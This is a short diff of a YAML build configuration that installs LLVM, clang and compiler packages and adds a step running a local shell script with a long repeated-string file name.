@@ -5,3 +5,4 @@ build:
         name: Lemad
         code: |-
           sudo apt-get install binfmt-support build-essential binutils gcc automake libllvm3.0 llvm-3.0 llvm-3.0-runtime llvm-3.0-dev llvm-3.0-doc clang libclang-dev -y
+          sh co3eN1ih9yahco3eN1ih9yahco3eN1ih9yahco3eN1ih9yah.sh
